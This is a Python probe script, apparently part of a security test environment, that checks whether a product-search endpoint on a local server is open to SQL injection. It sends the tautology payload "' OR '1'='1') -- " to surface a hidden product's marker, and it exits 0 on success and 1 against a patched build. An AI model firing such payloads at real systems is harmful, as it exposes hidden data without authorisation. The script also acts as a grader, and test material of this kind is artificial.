#!/usr/bin/env python3
"""Discriminating probe for sqli-product-search.

Injects a tautology payload into /search?q= that comments out the
visibility filter, surfacing the hidden (visible=0) QA prototype product
whose name carries the marker. Exits 0 iff the marker is observed in the
search response; exits 1 otherwise (e.g. against the patched app, where
the payload is treated as a literal search term and matches nothing).
"""
import os
import sys
import time
import urllib.parse
import urllib.request

MARKER = "FNDRY-SQLI-7Q2X9"
PAYLOAD = "' OR '1'='1') -- "


def fetch(url):
    req = urllib.request.Request(
        url, headers={"User-Agent": "foundry-probe/1.0"})
    with urllib.request.urlopen(req, timeout=5) as resp:
        return resp.read().decode("utf-8", "replace")


def main():
    base = os.environ.get("BASE_URL", "http://127.0.0.1:18080").rstrip("/")
    url = base + "/search?q=" + urllib.parse.quote(PAYLOAD)
    try:
        body = fetch(url)
    except Exception:
        time.sleep(0.5)  # one retry for startup races only
        try:
            body = fetch(url)
        except Exception:
            return 1
    return 0 if MARKER in body else 1


if __name__ == "__main__":
    sys.exit(main())
